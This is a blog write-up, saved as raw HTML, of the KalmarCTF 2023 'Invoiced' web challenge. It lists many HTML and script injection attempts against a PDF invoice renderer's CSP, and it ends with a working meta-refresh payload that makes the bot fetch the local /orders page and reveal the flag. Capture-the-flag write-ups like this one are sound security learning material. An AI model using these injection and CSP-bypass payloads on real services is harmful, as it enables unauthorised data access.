<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>KalmarCTF 2023 - Invoiced - Writeup - boxmein</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Final working payload Name: a</title><meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://127.0.0.1:5000/orders'&#34; />
Others: empty
What we know Download source Read files: payments.js - get discount code FREEZTUFSSZ1412 app.js - get the implementation GET /cart => show form to post to checkout POST /checkout => visit url, turn to pdf pdf impl: open puppeteer, visit /renderInvoice?name=&mldr;, wait for networkidle0, bake to pdf GET /renderInvoice => replace variables in template URL parameters are rendered without escaping => XSS GET /orders => return flag Find unique safety features: /renderInvoice has: CSP default-src unsafe-inline maxcdn."><meta property="og:image" content><meta property="og:title" content="KalmarCTF 2023 - Invoiced - Writeup"><meta property="og:description" content="Final working payload Name: a</title><meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://127.0.0.1:5000/orders'&#34; />
Others: empty
What we know Download source Read files: payments.js - get discount code FREEZTUFSSZ1412 app.js - get the implementation GET /cart => show form to post to checkout POST /checkout => visit url, turn to pdf pdf impl: open puppeteer, visit /renderInvoice?name=&mldr;, wait for networkidle0, bake to pdf GET /renderInvoice => replace variables in template URL parameters are rendered without escaping => XSS GET /orders => return flag Find unique safety features: /renderInvoice has: CSP default-src unsafe-inline maxcdn."><meta property="og:type" content="article"><meta property="og:url" content="https://boxmein.github.io/posts/2023-03-05-kalmarctf-invoiced/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-05T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-05T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="KalmarCTF 2023 - Invoiced - Writeup"><meta name=twitter:description content="Final working payload Name: a</title><meta http-equiv=&#34;Refresh&#34; content=&#34;0; url='http://127.0.0.1:5000/orders'&#34; />
Others: empty
What we know Download source Read files: payments.js - get discount code FREEZTUFSSZ1412 app.js - get the implementation GET /cart => show form to post to checkout POST /checkout => visit url, turn to pdf pdf impl: open puppeteer, visit /renderInvoice?name=&mldr;, wait for networkidle0, bake to pdf GET /renderInvoice => replace variables in template URL parameters are rendered without escaping => XSS GET /orders => return flag Find unique safety features: /renderInvoice has: CSP default-src unsafe-inline maxcdn."><link href=https://boxmein.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://boxmein.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><script src=https://boxmein.github.io/posthog-tag.js></script></head><body><div class=content><header><div class=main><a href=https://boxmein.github.io/>boxmein</a></div><nav></nav></header><main><article><div class=title><h1 class=title>KalmarCTF 2023 - Invoiced - Writeup</h1><div class=meta>Posted on Mar 5, 2023</div></div><section class=body><h2 id=final-working-payload>Final working payload</h2><p>Name: <code>a&lt;/title>&lt;meta http-equiv="Refresh" content="0; url='http://127.0.0.1:5000/orders'" /></code></p><p>Others: empty</p><h2 id=what-we-know>What we know</h2><ul><li>Download source</li><li>Read files:<ul><li>payments.js - get discount code FREEZTUFSSZ1412</li><li>app.js - get the implementation<ul><li>GET /cart => show form to post to checkout</li><li>POST /checkout => visit url, turn to pdf<ul><li>pdf impl: open puppeteer, visit /renderInvoice?name=&mldr;, wait for
networkidle0, bake to pdf</li></ul></li><li>GET /renderInvoice => replace variables in template<ul><li>URL parameters are rendered without escaping => XSS</li></ul></li><li>GET /orders => return flag</li></ul></li></ul></li><li>Find unique safety features:<ul><li>/renderInvoice has:<ul><li>CSP<ul><li>default-src unsafe-inline maxcdn.bootstrapcdn</li><li>object-src none</li><li>script-src none</li><li>img-src self dummyimage.com</li></ul></li></ul></li><li>/orders has:<ul><li>checks remote address is 127.0.0.1</li><li>checks for no &ldquo;Bot&rdquo; cookie</li><li>sets X-Frame-Options to none (NO EFFECT)</li><li>returns flag</li></ul></li><li>PDF bot always sets the bot cookie<ul><li>SameSite=Strict</li><li>HttpOnly</li></ul></li></ul></li></ul><h2 id=enumerate-the-possibilities>Enumerate the possibilities</h2><p>In no defined order, we tried to inject:</p><ul><li>script tag<ul><li>fails because script-src</li></ul></li><li>meta http-equiv CSP<ul><li>first thought it was failing because it was rendered twice&mldr;
used tricks like <code>name=...&lt;!-- address=--></code> to no avail
wrong, it was failing because of the subtractive principle of csp</li><li>if CSP header and meta tag are both present, they are subtractive</li></ul></li><li>iframe <code>/orders</code><ul><li>fails because frame-src</li><li>got too stuck on credentialless iframe, spent way too much time</li></ul></li><li>iframe srcdoc then script<ul><li>fails because srcdoc inherits parent CSP</li></ul></li><li>Reviewing bootstrap<ul><li>Nothing interesting
.. and would still follow CSP</li></ul></li><li>Considered scanning maxcdn<ul><li>didn&rsquo;t</li></ul></li><li><code>&lt;img src="/orders"></code><ul><li>works but wrong mime so broken image :)</li><li>no interesting mime types that are actually plaintext, either</li><li>using <code>&lt;picture>&lt;source src></code> to set the mime type doesn&rsquo;t work<ul><li>because the flag is not an SVG</li></ul></li></ul></li><li>loading it as a VTT subtitle<ul><li>using <code>&lt;video>&lt;track></code> doesn&rsquo;t work because CSP
(media-src => default-src => no &lsquo;self&rsquo;)</li></ul></li><li>got desperate, thought we could load JS from bootstrap cdn<ul><li>still can&rsquo;t, script-src hasn&rsquo;t changed, it&rsquo;s still none &mldr;</li></ul></li><li><code>&lt;base></code> tag?<ul><li>no</li></ul></li><li>trusted types?<ul><li>what?</li></ul></li><li>then <code>@amahlaka97</code> flies in with
<code>a&lt;/title>&lt;meta http-equiv="Refresh" content="0; url='http://localhost:5000/orders'" /></code></li><li>have to bypass bot cookie<ul><li>maybe we run the meta inside a credentialless iframe?<ul><li>no, because CSP frame-src</li></ul></li></ul></li><li><code>amahlaka97</code>: we somehow just need to get the bot cookie removed from the refresh request<ul><li>yes</li><li>just change the origin</li><li>localhost is not 127.0.0.1</li></ul></li><li>HUH WAIT THAT COULD BE IT<ul><li><code>a&lt;/title>&lt;meta http-equiv="Refresh" content="0; url='http://127.0.0.1:5000/orders'" /></code></li><li>BOOM FLÃ„G</li></ul></li></ul><p>kalmar{fr33_r34l_3st4t3_c91ad62}</p><h2 id=learnings>Learnings</h2><ul><li>Be comprehensive</li><li>Get an <code>@amahlaka97</code> in your team</li><li>There are many many ways to load files</li><li>CSP can&rsquo;t be relaxed, only restricted with more CSP tags</li><li>Never forget meta refresh tag</li></ul><h2 id=ranting-and-rambling-while-solving-it>Ranting and rambling while solving it&mldr;</h2><ul><li>lots of different things we tried to mess with CSP</li></ul><pre tabindex=0><code>&lt;iframe loading=&#34;eager&#34; src=&#34;/orders&#34; width=&#34;200&#34; height=&#34;200&#34; style=&#34;background:red&#34; credentialless&gt;NOT LOADED&lt;/iframe&gt;
</code></pre><ul><li>empty page (cc invoice.pdf, invoice2.pdf)</li></ul><pre tabindex=0><code>&lt;iframe srcdoc=&#34;&lt;!DOCTYPE html&gt;&#34;&gt;&lt;/iframe&gt;
</code></pre><p>^ Works but can&rsquo;t run scripts &ndash; it inherits csp</p><p>Idea from Carlos (Hi @carlospolop)</p><p><a href=https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp</a></p><pre tabindex=0><code>&lt;iframe src=&#39;data:text/html,&lt;script&gt;fetch(&#34;/orders&#34;)&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;
</code></pre><hr><p><a href="http://invoiced.chal-kalmarc.tf/renderInvoice?name=%3Ciframe%20src=%22data:text/html,HI%22%3E%3C/iframe%3E">http://invoiced.chal-kalmarc.tf/renderInvoice?name=%3Ciframe%20src=%22data:text/html,HI%22%3E%3C/iframe%3E</a></p><p>csp default-src &lsquo;unsafe-inline&rsquo; maxcdn.bootstrapcdn.com; object-src &rsquo;none&rsquo;; script-src &rsquo;none&rsquo;; img-src &lsquo;self&rsquo; dummyimage.com</p><pre tabindex=0><code>&lt;iframe src=&#34;https://maxcdn.bootstrapcdn.com&#34; sandbox=&#34;allow-scripts&#34;&gt;&lt;/iframe&gt;
</code></pre><hr><p>We can write the csp tag since name is injected to head?</p><pre tabindex=0><code>/renderInvoice?name=&lt;/title&gt;&lt;meta%20http-equiv=&#34;Content-Security-Policy&#34;%20content=&#34;default-src%20*%20%27unsafe-inline%27,script-src%20%27unsafe-inline%27&#34;&gt;&amp;address=Fred&lt;script&gt;fetch(&#34;/orders&#34;).then(x=&gt;x.text()).then((text)document.body.innerHTML+=text;&lt;/script&gt;
</code></pre><pre tabindex=0><code>http://localhost:5001/renderInvoice?name=fred%3C/title%3E%3Cmeta%20http-equiv=%22Content-Security-Policy%22%20content=%22frame-src%20*%22%3E&amp;address=%3Ciframe%20src=%22http://localhost:5001/orders%22%20credentialless%3E%3C/iframe%3E
</code></pre><p>NAME:</p><pre tabindex=0><code>fred&lt;/title&gt;&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src * &#39;unsafe-inline&#39;; frame-src http://localhost:5001&#34;&gt;&lt;/head&gt;&lt;body&gt;&lt;!--
</code></pre><p>ADDRESS:</p><pre tabindex=0><code>--&gt;&lt;iframe src=&#34;http://localhost:5001/orders&#34; credentialless&gt;&lt;/iframe&gt;
</code></pre><hr><pre tabindex=0><code>fred&lt;/title&gt;&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src * &#39;unsafe-inline&#39;; script-src *; frame-src http://localhost:5001&#34;&gt;&lt;/head&gt;&lt;body&gt;&lt;!--
</code></pre><hr><p>HMM</p><p>Judging the CSP again &mldr;</p><ul><li>img-src &lsquo;self&rsquo;</li><li>the only endpoint without explicit setHeader(&ldquo;Content-Type&rdquo;&mldr;) is /orders</li></ul><hr><p>Can&rsquo;t load it as CSS (default-src ! &lsquo;self&rsquo;)</p><pre tabindex=0><code>http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E%3Clink%20rel=%22stylesheet%22%20href=%22/orders%22%20type=%22text/css%22%3E&amp;address=bork%3Ckalmar%3EHELLO%3C/kalmar%3E
</code></pre><hr><p>Can&rsquo;t seem to load it as SVG</p><pre tabindex=0><code>http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E&amp;address=%3Cpicture%3E%3Csource%20srcset=%22/orders%22%20type=%22image/svg%2bxml%22%20media=%22screen%22%3E%3Cimg%20src=%22https://dummyimage.com/70x70/000/fff%22%3E%3C/picture%3E&amp;phone=hello%3Cstyle%3Ebody{background:url(/orders)}%3C/style%3E
</code></pre><hr><p>Can&rsquo;t seem to use base href for anything useful</p><pre tabindex=0><code>http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E%3Cbase%20href=%22/orders%22%3E&amp;address=%3Cpicture%3E%3Csource%20srcset=%22/orders%22%20type=%22image/svg%2bxml%22%20media=%22screen%22%3E%3Cimg%20src=%22https://dummyimage.com/70x70/000/fff%22%3E%3C/picture%3E&amp;phone=hello%3Cstyle%3Ebody{background:url(/orders)}%3C/style%3E
</code></pre></section><div class=post-tags></div></article></main><footer><div style=display:flex></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer></div></body></html>